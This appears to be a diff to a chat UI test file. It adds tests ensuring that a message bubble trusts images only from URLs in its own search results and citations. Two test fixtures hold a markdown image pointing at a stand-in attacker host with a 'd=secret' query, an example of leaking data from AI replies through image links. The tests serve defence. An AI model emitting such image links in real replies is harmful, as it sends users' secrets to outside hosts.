@@ -42,17 +42,20 @@ vi.mock('@agiworkforce/unified-chat', async (importOriginal) => {
       literalHtml,
       linkifyNumericCitations,
       citations,
+      trustedImageUrls,
     }: {
       content: string;
       literalHtml?: boolean;
       linkifyNumericCitations?: boolean;
       citations?: readonly { url: string }[];
+      trustedImageUrls?: readonly string[];
     }) => (
       <span
         data-testid="markdown-content"
         data-literal-html={literalHtml ? 'true' : 'false'}
         data-linkify-numeric-citations={linkifyNumericCitations ? 'true' : 'false'}
         data-citation-urls={citations?.map((source) => source.url).join('|') ?? ''}
+        data-trusted-image-urls={trustedImageUrls?.join('|') ?? ''}
       >
         {content}
       </span>
@@ -403,6 +406,53 @@ describe('MessageBubble', () => {
         'data-citation-urls',
         'https://www.iana.org/help/example-domains|https://www.iana.org/domains/reserved',
       );
+    });
+
+    it('vouches for images only by the URLs of its own search results and citations', () => {
+      render(
+        <MessageBubble
+          message={makeMessage({
+            role: 'assistant',
+            content: 'A photo ![tower](https://attacker.example/p.png?d=secret)',
+            metadata: {
+              searchResults: [
+                {
+                  url: 'https://www.iana.org/help/example-domains',
+                  title: 'Example Domains',
+                  snippet: '',
+                },
+              ],
+              citations: [
+                { url: 'https://www.iana.org/domains/reserved', title: 'Reserved Domains' },
+              ],
+            },
+          })}
+        />,
+      );
+
+      const trusted = screen
+        .getByTestId('markdown-content')
+        .getAttribute('data-trusted-image-urls')
+        ?.split('|');
+      expect(new Set(trusted)).toEqual(
+        new Set([
+          'https://www.iana.org/help/example-domains',
+          'https://www.iana.org/domains/reserved',
+        ]),
+      );
+    });
+
+    it('vouches for no image in a reply that searched nothing', () => {
+      render(
+        <MessageBubble
+          message={makeMessage({
+            role: 'assistant',
+            content: 'A photo ![tower](https://attacker.example/p.png?d=secret)',
+          })}
+        />,
+      );
+
+      expect(screen.getByTestId('markdown-content')).toHaveAttribute('data-trusted-image-urls', '');
     });
 
     it('renders the previous chats that informed an assistant turn', () => {
